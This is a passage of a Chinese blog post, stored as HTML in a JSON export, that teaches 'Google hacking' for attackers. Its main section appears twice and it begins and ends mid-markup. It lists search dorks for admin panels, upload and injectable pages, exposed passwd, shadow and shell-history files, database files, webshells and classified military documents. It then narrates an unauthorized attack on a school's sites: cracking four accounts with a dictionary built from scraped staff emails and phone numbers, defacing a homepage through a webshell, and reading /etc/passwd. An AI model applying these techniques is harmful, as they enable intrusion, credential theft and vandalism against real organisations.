filetype:aspx</span><br><span class=\"line\"></span><br><span class=\"line\">site:a3<span class=\"selector-class\">.xxxx</span><span class=\"selector-class\">.com</span> filetype:asp</span><br></pre></td></tr></table></figure>\n<p>a2服务器用的应该是IIS，上面用的是asp的整站程序，还有一个php的论坛</p>\n<p>a3服务器也是IIS，aspx+asp。web程序都应该是自己开发的。有论坛那就看看能不能遇见什么公共的FTP帐号什么的：</p>\n<figure class=\"highlight groovy\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">site:</span>a2.xxxx.com <span class=\"string\">intext:</span><span class=\"string\">ftp:</span><span class=\"comment\">//:</span></span><br></pre></td></tr></table></figure>\n<p>再看看有没有上传一类的漏洞：</p>\n<figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">site:a2<span class=\"selector-class\">.xxxx</span><span class=\"selector-class\">.com</span> inurl:file</span><br><span class=\"line\"></span><br><span class=\"line\">site:a3<span class=\"selector-class\">.xxxx</span><span class=\"selector-class\">.com</span> inurl:load</span><br></pre></td></tr></table></figure>\n<p>在a2上发现一个上传文件的页面：</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"regexp\">//</span>a2.xxxx.com<span class=\"regexp\">/sys/u</span>ploadfile.asp</span><br></pre></td></tr></table></figure>\n<p>用IE看了一下，没权限访问。试试注射</p>\n<figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">site:a2<span class=\"selector-class\">.xxxx</span><span class=\"selector-class\">.com</span> filetype:asp</span><br></pre></td></tr></table></figure>\n<p>一般学校的站点的密码都比较有规律，通常都是域名+电话一类的变形</p>\n<figure class=\"highlight less\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">site</span>:xxxx.com <span class=\"comment\">//得到N个二级域名</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">site</span>:xxxx.com <span class=\"attribute\">intext</span>:<span class=\"variable\">@xxxx</span>.com <span class=\"comment\">//得到N个邮件地址，还有邮箱的主人的名字什么的</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">site</span>:xxxx.com <span class=\"attribute\">intext</span>:电话 <span class=\"comment\">//N个电话</span></span><br></pre></td></tr></table></figure>\n<p>把这些信息做个字典，挂上慢慢跑。过了一段时间就跑出4个帐号，2个是学生会的，1个管理员，还有一个可能是老师的帐号</p>\n<p>google hack其实也都差不多是一些基本语法的灵活运用，或者配合某个脚本漏洞，主要还是靠个人的灵活思维</p>\n<p>对于一些在win上跑 apache的应该多注意一下这方面，一个<code>intitle:index of</code>就差不多都出来了 <code>echo “召唤” &gt; index.jsp</code> 现在看看首页，已经被改成: “召唤” 了。</p>\n<p>也可以用WGET上传一个文件上去，然后<code>execute Command输入 cat file &gt; index.html or echo “”&gt; file echo “test” &gt;&gt; file</code> 这样一条条打出来，站点首页就成功被替换了</p>\n<p>同样的也可以 <code>uname -a;cat /etc/passwd</code> 不过有点要注意，有些WEBSHELL程序有问题，执行不了的，</p>\n<h4 id=\"搜索INC敏感信息\"><a href=\"#搜索INC敏感信息\" class=\"headerlink\" title=\"搜索INC敏感信息\"></a>搜索INC敏感信息</h4><p>在google的搜索框中填入: <code>Code: .org filetype:inc</code> </p>\n<p>例：常用的google关键字： foo1 foo2 (也就是关联，比如搜索xx公司 xx美女) </p>\n<p><code>operator:foo filetype:123</code> 类型 </p>\n<p><code>site:foo.com</code> 相对直接看网站更有意思，可以得到许多意外的信息 </p>\n<p><code>intext:foo intitle: fooltitle</code> 标题 <code>allinurl:foo</code> 搜索xx网站的所有相关连接。（踩点必备） </p>\n<p><code>links:foo</code>不要说就知道是它的相关链接 </p>\n<p><code>allintilte:foo.com</code> 可以辅助<code>”-” “+”</code>来调整搜索的精确程度 直接搜索密码：(引号表示为精确搜索)</p>\n<p>可以再延伸到上面的结果里进行二次搜索</p>\n<p><code>“index of” htpasswd / passwd filetype:xls username password email “ws_ftp.log” “config.php” allinurl:admin mdb service filetype:pwd</code></p>\n<p>或者某个比如pcanywhere的密码后缀cif等</p>\n<p>再来点更敏感信息 <code>“robots.txt” “Disallow:” filetype:txt inurl:_vti_cnf</code> (FrontPage的关键索引啦，扫描器的CGI库一般都有) </p>\n<p><code>allinurl: /msadc/Samples/selector/showcode.asp /../../../passwd /examples/jsp/snp/snoop.jsp phpsysinfo intitle:index of /admin intitle:”documetation” inurl: 5800(vnc的端口)</code></p>\n<p>或者desktop port等多个关键字检索 <code>webmin port 10000 inurl:/admin/login.asp intext:　Powered by GBook365 intitle:”php shell” “Enable stderr” filetype:php</code> 直接搜索到phpwebshell</p>\n<figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">foo.org filetype:inc</span><br><span class=\"line\"></span><br><span class=\"line\">ipsec filetype:conf</span><br><span class=\"line\"></span><br><span class=\"line\">intilte:”<span class=\"builtin-name\">error</span> occurred” ODBC request where (select|insert) 说白了就是说，可以直接试着查查数据库检索，针对目前流行的sql注射</span><br><span class=\"line\"></span><br><span class=\"line\">“Dumping data <span class=\"keyword\">for</span> table” username password</span><br><span class=\"line\"></span><br><span class=\"line\">intitle:”<span class=\"builtin-name\">Error</span> using Hypernews”</span><br><span class=\"line\"></span><br><span class=\"line\">“Server Software”</span><br><span class=\"line\"></span><br><span class=\"line\">intitle:”<span class=\"attribute\">HTTP_USER_AGENT</span>=Googlebot”</span><br><span class=\"line\"></span><br><span class=\"line\">“<span class=\"attribute\">HTTP_USER_ANGET</span>=Googlebot” THS ADMIN</span><br><span class=\"line\"></span><br><span class=\"line\">filetype:.doc site:.mil classified 直接搜索军方相关word</span><br></pre></td></tr></table></figure>\n<p>检查多个关键字：<br><figure class=\"highlight stata\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">intitle:config confixx login password</span><br><span class=\"line\"></span><br><span class=\"line\">“mydomain.com” nessus <span class=\"keyword\">report</span></span><br><span class=\"line\"></span><br><span class=\"line\">“<span class=\"keyword\">report</span> generated <span class=\"keyword\">by</span>”</span><br><span class=\"line\"></span><br><span class=\"line\">“ipconfig”</span><br><span class=\"line\"></span><br><span class=\"line\">“winipconfig”</span><br></pre></td></tr></table></figure></p>\n<p>google缓存利用，搜索时候多”选搜索所有网站”</p>\n<p>特别推荐：administrator users 等相关的东西，比如名字，生日等……最惨也可以拿来做字典</p>\n<p>一些技巧集合：</p>\n<p>1) index.of.password</p>\n<p>1) filetype:blt “buddylist”</p>\n<p>2) “access denied for user” “using password”</p>\n<p>2) intitle:”index of” inurl:ftp (pub | incoming)</p>\n<p>3) “http://:@www” domainname</p>\n<p>3) filetype:cnf inurl:_vti_pvt access.cnf</p>\n<p>4) auth_user_file.txt</p>\n<p>4) allinurl:”//_vti_pvt/” | allinurl:”//_vti_cnf/”</p>\n<p>5) The Master List</p>\n<p>5) inurl:”install/install.php”</p>\n<p>6) allinurl: admin mdb</p>\n<p>6) intitle:”welcome.to.squeezebox”</p>\n<p>7) passlist.txt (a better way)</p>\n<p>7) intext:””BiTBOARD v2.0″ BiTSHiFTERS Bulletin Board”</p>\n<p>8) “A syntax error has occurred” filetype:ihtml</p>\n<p>8) intitle:　Login intext:”RT is ? Copyright”</p>\n<p>9) “# -FrontPage-” inurl:service.pwd</p>\n<p>9) ext:php program_listing intitle:MythWeb.Program.Listing</p>\n<p>10) ORA-00921: unexpected end of SQL command</p>\n<p>10) intitle:index.of abyss.conf</p>\n","site":{"data":{}},"excerpt":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>Google hacker (Google黑客)是利用GOOGLE提供的搜索功能查找黑客们想找到的信息，一般是查找网站后台，网管的个人信息，也可以用来查找某人在网络上的活动</p>\n<p>Google hacker 一般是做为黑客在入侵时的一个手段，在入侵过程中有时需要查找后台的登陆口就需要用到GOOGLE HACKER，有时猜解密码的时候google也是提供查找管理员资料的有效平台</p>","more":"<h3 id=\"常用语法\"><a href=\"#常用语法\" class=\"headerlink\" title=\"常用语法\"></a>常用语法</h3><h4 id=\"intext\"><a href=\"#intext\" class=\"headerlink\" title=\"intext\"></a>intext</h4><p>这个就是把网页中的正文内容中的某个字符做为搜索条件，例如在google里输入<code>intext:动漫</code>，将返回所有在网页正文部分包含”动漫”的网页，<code>allintext:</code>使用方法和<code>intext</code>类似</p>\n<h4 id=\"intitle\"><a href=\"#intitle\" class=\"headerlink\" title=\"intitle\"></a>intitle</h4><p>和intext差不多，搜索网页标题中是否有所要找的字符，例如搜索:<code>intitle:安全天使</code>，将返回所有网页标题中包含”安全天使”的网页，同理<code>allintitle:</code>也同<code>intitle</code>类似</p>\n<h4 id=\"cache\"><a href=\"#cache\" class=\"headerlink\" title=\"cache\"></a>cache</h4><p>搜索google里关于某些内容的缓存，也许能找到一些好东西</p>\n<h4 id=\"define\"><a href=\"#define\" class=\"headerlink\" title=\"define\"></a>define</h4><p>搜索某个词语的定义，搜索:<code>define:hacker</code>，将返回关于hacker的定义</p>\n<h4 id=\"filetype\"><a href=\"#filetype\" class=\"headerlink\" title=\"filetype\"></a>filetype</h4><p>搜索指定类型的文件，撒网式攻击还是对特定目标进行信息收集都需要用到这个，例如输入:<code>filetype:doc</code>，将返回所有以doc结尾的文件URL，如果找.bak、.mdb或.inc也是可以的，获得的信息也许会更丰富</p>\n<h4 id=\"info\"><a href=\"#info\" class=\"headerlink\" title=\"info\"></a>info</h4><p>查找指定站点的一些基本信息</p>\n<h4 id=\"inurl\"><a href=\"#inurl\" class=\"headerlink\" title=\"inurl\"></a>inurl</h4><p>搜索:<code>inurl:www.123.net</code>可以返回所有和<code>www.123.net</code>做了链接的URL</p>\n<h4 id=\"site\"><a href=\"#site\" class=\"headerlink\" title=\"site\"></a>site</h4><p>搜索:<code>site:www.123.net</code>，将返回所有和123.net这个站有关的URL</p>\n<p>还有一些操作符也是很有用的:</p>\n<figure class=\"highlight asciidoc\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">– 把某个字忽略</span><br><span class=\"line\"></span><br><span class=\"line\">~ 同意词</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"bullet\">. </span>单一的通配符</span><br><span class=\"line\"></span><br><span class=\"line\">“” 精确查询</span><br></pre></td></tr></table></figure>\n<h3 id=\"典型用法\"><a href=\"#典型用法\" class=\"headerlink\" title=\"典型用法\"></a>典型用法</h3><ul>\n<li>找管理后台地址</li>\n</ul>\n<figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">site:xxx.com intext：管理后台登陆用户名密码系統账号</span><br><span class=\"line\"></span><br><span class=\"line\">site:xxx.com inurl: login/admin/manage/manager/adminlogin<span class=\"built_in\">/system </span></span><br><span class=\"line\"></span><br><span class=\"line\">site:xxx.com intitle 管理后台登陆</span><br></pre></td></tr></table></figure>\n<ul>\n<li>找上传类漏洞地址：</li>\n</ul>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">site</span><span class=\"selector-pseudo\">:xxx.com</span> <span class=\"selector-tag\">inurl</span><span class=\"selector-pseudo\">:file</span> </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">site</span><span class=\"selector-pseudo\">:xxx.com</span> <span class=\"selector-tag\">inurl</span><span class=\"selector-pseudo\">:upload</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>找注入页面</li>\n</ul>\n<figure class=\"highlight groovy\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">site:</span>xxx.com <span class=\"string\">inurl:</span>php?id=</span><br></pre></td></tr></table></figure>\n<ul>\n<li>找编辑器页面</li>\n</ul>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">site</span><span class=\"selector-pseudo\">:xxx.com</span> <span class=\"selector-tag\">inurl</span><span class=\"selector-pseudo\">:ewebeditor</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"实际应用\"><a href=\"#实际应用\" class=\"headerlink\" title=\"实际应用\"></a>实际应用</h3><p>对于攻击者来说，可能最感兴趣的就是密码文件了，而google正因为其强大的搜索能力往往会把一些敏感信息透露出来，用google搜索以下内容</p>\n<figure class=\"highlight delphi\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">intitle:”<span class=\"keyword\">index</span> <span class=\"keyword\">of</span>” etc</span><br><span class=\"line\"></span><br><span class=\"line\">intitle:”<span class=\"keyword\">Index</span> <span class=\"keyword\">of</span>” .sh_history</span><br><span class=\"line\"></span><br><span class=\"line\">intitle:”<span class=\"keyword\">Index</span> <span class=\"keyword\">of</span>” .bash_history</span><br><span class=\"line\"></span><br><span class=\"line\">intitle:”<span class=\"keyword\">index</span> <span class=\"keyword\">of</span>” passwd</span><br><span class=\"line\"></span><br><span class=\"line\">intitle:”<span class=\"keyword\">index</span> <span class=\"keyword\">of</span>” people.lst</span><br><span class=\"line\"></span><br><span class=\"line\">intitle:”<span class=\"keyword\">index</span> <span class=\"keyword\">of</span>” pwd.db</span><br><span class=\"line\"></span><br><span class=\"line\">intitle:”<span class=\"keyword\">index</span> <span class=\"keyword\">of</span>” etc/shadow</span><br><span class=\"line\"></span><br><span class=\"line\">intitle:”<span class=\"keyword\">index</span> <span class=\"keyword\">of</span>” spwd</span><br><span class=\"line\"></span><br><span class=\"line\">intitle:”<span class=\"keyword\">index</span> <span class=\"keyword\">of</span>” master.passwd</span><br><span class=\"line\"></span><br><span class=\"line\">intitle:”<span class=\"keyword\">index</span> <span class=\"keyword\">of</span>” htpasswd</span><br><span class=\"line\"></span><br><span class=\"line\">“# -FrontPage-” inurl:service.pwd</span><br></pre></td></tr></table></figure>\n<p>同样可以用google来搜索一些具有漏洞的程序，例如ZeroBoard前段时间发现个文件代码泄露漏洞，我们可以用google来找网上使用这套程序的站点:</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">intext</span><span class=\"selector-pseudo\">:ZeroBoard</span> <span class=\"selector-tag\">filetype</span><span class=\"selector-pseudo\">:php</span></span><br></pre></td></tr></table></figure>\n<p>或者使用:</p>\n<figure class=\"highlight groovy\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">inurl:</span>　outlogin.php?_zb_path= site:.jp</span><br></pre></td></tr></table></figure>\n<p>phpmyadmin是一套功能强大的数据库操作软件，一些站点由于配置失误，导致可以不使用密码直接对phpmyadmin进行操作，可以用google搜索存在这样漏洞的程序</p>\n<figure class=\"highlight groovy\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">intitle:</span>phpmyadmin <span class=\"string\">intext:</span>Create <span class=\"keyword\">new</span> database</span><br></pre></td></tr></table></figure>\n<p>可以用google来搜索数据库文件，用上一些语法来精确查找能够获得更多东西(access的数据库,mssql、mysql的连接文件等等)</p>\n<figure class=\"highlight less\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">allinurl</span>:bbs data</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">filetype</span>:mdb <span class=\"attribute\">inurl</span>:database</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">filetype</span>:inc conn</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">inurl</span>:data <span class=\"attribute\">filetype</span>:mdb</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">intitle</span>:”index of” data <span class=\"comment\">//在一些配置不正确的apache+win32的服务器上经常出现这种情况</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"实战演示\"><a href=\"#实战演示\" class=\"headerlink\" title=\"实战演示\"></a>实战演示</h3><p>利用google完全是可以对一个站点进行信息收集和渗透的，下面用google对特定站点进行一次测试</p>\n<p>首先用google先看这个站点的一些基本情况</p>\n<figure class=\"highlight avrasm\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"symbol\">site:</span>xxxx.com</span><br></pre></td></tr></table></figure>\n<p>从返回的信息中，找到几个该校的几个系院的域名：</p>\n<figure class=\"highlight dts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"symbol\">http:</span><span class=\"comment\">//a1.xxxx.com</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"symbol\">http:</span><span class=\"comment\">//a2.xxxx.com</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"symbol\">http:</span><span class=\"comment\">//a3.xxxx.com</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"symbol\">http:</span><span class=\"comment\">//a4.xxxx.com</span></span><br></pre></td></tr></table></figure>\n<p>顺便ping了一下，应该是在不同的服务器，学校一般都会有不少好的资料</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">site</span><span class=\"selector-pseudo\">:xxxx.com</span> <span class=\"selector-tag\">filetype</span><span class=\"selector-pseudo\">:doc</span></span><br></pre></td></tr></table></figure>\n<p>得到N个不错的doc。先找找网站的管理后台地址：</p>\n<figure class=\"highlight less\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">site</span>:xxxx.com <span class=\"attribute\">intext</span>:管理</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">site</span>:xxxx.com <span class=\"attribute\">inurl</span>:login</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">site</span>:xxxx.com <span class=\"attribute\">intitle</span>:管理</span><br></pre></td></tr></table></figure>\n<p>超过获得2个管理后台地址：</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"regexp\">//</span>a2.xxxx.com<span class=\"regexp\">/sys/</span>admin_login.asp</span><br><span class=\"line\"></span><br><span class=\"line\">http:<span class=\"regexp\">//</span>a3.xxxx.com:<span class=\"number\">88</span><span class=\"regexp\">/_admin/</span>login_in.asp</span><br></pre></td></tr></table></figure>\n<p>看看服务器上跑的是什么程序：</p>\n<figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">site:a2<span class=\"selector-class\">.xxxx</span><span class=\"selector-class\">.com</span> filetype:asp</span><br><span class=\"line\"></span><br><span class=\"line\">site:a2<span class=\"selector-class\">.xxxx</span><span class=\"selector-class\">.com</span> filetype:php</span><br><span class=\"line\"></span><br><span class=\"line\">site:a2<span class=\"selector-class\">.xxxx</span><span class=\"selector-class\">.com</span> filetype:aspx</span><br><span class=\"line\"></span><br><span class=\"line\">site:a3<span class=\"selector-class\">.xxxx</span><span class=\"selector-class\">.com</span> filetype:asp</span><br></pre></td></tr></table></figure>\n<p>a2服务器用的应该是IIS，上面用的是asp的整站程序，还有一个php的论坛</p>\n<p>a3服务器也是IIS，aspx+asp。web程序都应该是自己开发的。有论坛那就看看能不能遇见什么公共的FTP帐号什么的：</p>\n<figure class=\"highlight groovy\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">site:</span>a2.xxxx.com <span class=\"string\">intext:</span><span class=\"string\">ftp:</span><span class=\"comment\">//:</span></span><br></pre></td></tr></table></figure>\n<p>再看看有没有上传一类的漏洞：</p>\n<figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">site:a2<span class=\"selector-class\">.xxxx</span><span class=\"selector-class\">.com</span> inurl:file</span><br><span class=\"line\"></span><br><span class=\"line\">site:a3<span class=\"selector-class\">.xxxx</span><span class=\"selector-class\">.com</span> inurl:load</span><br></pre></td></tr></table></figure>\n<p>在a2上发现一个上传文件的页面：</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"regexp\">//</span>a2.xxxx.com<span class=\"regexp\">/sys/u</span>ploadfile.asp</span><br></pre></td></tr></table></figure>\n<p>用IE看了一下，没权限访问。试试注射</p>\n<figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">site:a2<span class=\"selector-class\">.xxxx</span><span class=\"selector-class\">.com</span> filetype:asp</span><br></pre></td></tr></table></figure>\n<p>一般学校的站点的密码都比较有规律，通常都是域名+电话一类的变形</p>\n<figure class=\"highlight less\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">site</span>:xxxx.com <span class=\"comment\">//得到N个二级域名</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">site</span>:xxxx.com <span class=\"attribute\">intext</span>:<span class=\"variable\">@xxxx</span>.com <span class=\"comment\">//得到N个邮件地址，还有邮箱的主人的名字什么的</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">site</span>:xxxx.com <span class=\"attribute\">intext</span>:电话 <span class=\"comment\">//N个电话</span></span><br></pre></td></tr></table></figure>\n<p>把这些信息做个字典，挂上慢慢跑。过了一段时间就跑出4个帐号，2个是学生会的，1个管理员，还有一个可能是老师的帐号</p>\n<p>google hack其实也都差不多是一些基本语法的灵活运用，或者配合某个脚本漏洞，主要还是靠个人的灵活思维</p>\n<p>对于一些在win上跑 apache的应该多注意一下这方面，一个<code>intitle:index of</code>就差不多都出来了 <code>echo “召唤” &gt; index.jsp</code> 现在看看首页，已经被改成: “召唤” 了。</p>\n<p>也可以用WGET上传一个文件上去，然后<code>execute Command输入 cat file &gt; index.html or echo “”&gt; file echo “test” &gt;&gt; file</code> 这样一条条打出来，站点首页就成功被替换了</p>\n<p>同样的也可以 <code>uname -a;cat /etc/passwd</code> 不过有点要注意，有些WEBSHELL程序有问题，执行不了的，</p>\n<h4 id=\"搜索INC敏感信息\"><a href=\"#搜索INC敏感信息\" class=\"headerlink\" title=\"搜索INC敏感信息\"></a>搜索INC敏感信息</h4><p>在google的搜索框中填入: <code>Code: .org filetype:inc</code> </p>\n<p>例：常用的google关键字： foo1 foo2 (也就是关联，比如搜索xx公司 xx美女) </p>\n<p><code>operator:foo filetype:123</code> 类型 </p>\n<p><code>site:foo.com</code> 相对直接看网站更有意思，可以得到许多意外的信息 </p>\n<p><code>intext:foo intitle: fooltitle</code> 标题 <code>allinurl:foo</code> 搜索xx网站的所有相关连接。（踩点必备） </p>\n<p><code>links:foo</code>不要说就知道是它的相关链接 </p>\n<p><code>allintilte:foo.com</code> 可以辅助<code>”-” “+”</code>来调整搜索的精确程度 直接搜索密码：(引号表示为精确搜索)</p>\n<p>可以再延伸到上面的结果里进行二次搜索</p>\n<p><code>“index of” htpasswd / passwd filetype:xls username password email “ws_ftp.log” “config.php” allinurl:admin mdb service filetype:pwd</code></p>\n<p>或者某个比如pcanywhere的密码后缀cif等</p>\n<p>再来点更敏感信息 <code>“robots.txt” “Disallow:” filetype:txt inurl:_vti_cnf</code> (FrontPage的关键索引啦，扫描器的CGI库一般都有) </p>\n<p><code>allinurl: /msadc/Samples/selector/showcode.asp /../../../passwd /examples/jsp/snp/snoop.jsp phpsysinfo intitle:index of /admin intitle:”documetation” inurl: 5800(vnc的端口)</code></p>\n<p>或者desktop port等多个关键字检索 <code>webmin port 10000 inurl:/admin/login.asp intext:　Powered by GBook365 intitle:”php shell” “Enable stderr” filetype:php</code> 直接搜索到phpwebshell</p>\n<figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">foo.org filetype:inc</span><br><span class=\"line\"></span><br><span class=\"line\">ipsec filetype:conf</span><br><span class=\"line\"></span><br><span class=\"line\">intilte:”<span class=\"builtin-name\">error</span> occurred” ODBC request where (select|insert) 说白了就是说，可以直接试着查查数据库检索，针对目前流行的sql注射</span><br><span class=\"line\"></span><br><span class=\"line\">“Dumping data <span class=\"keyword\">for</span> table” username password</span><br><span class=\"line\"></span><br><span class=\"line\">intitle:”<span class=\"builtin-name\">Error</span> using Hypernews”</span><br><span class=\"line\"></span><br><span class=\"line\">“Server Software”</span><br><span class=\"line\"></span><br><span class=\"line\">intitle:”<span class=\"attribute\">HTTP_USER_AGENT</span>=Googlebot”</span><br><span class=\"line\"></span><br><span class=\"line\">“<span class=\"attribute\">HTTP_USER_ANGET</span>=Googlebot” THS ADMIN</span><br><span class=\"line\"></span><br><span class=\"line\">filetype:.doc site:.mil classified 直接搜索军方相关word</span><br></pre></td></tr></table></figure>\n<p>检查多个关键字：<br><figure class=\"highlight stata\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">intitle:config confixx login password</span><br><span class=\"line\"></span><br><span class=\"line\">“mydomain.com” nessus <span class=\"keyword\">report</span></span><br><span class=\"line\"></span><br><span class=\"line\">“<span class=\"keyword\">report</span> generated <span class=\"keyword\">by</span>”</span><br><span 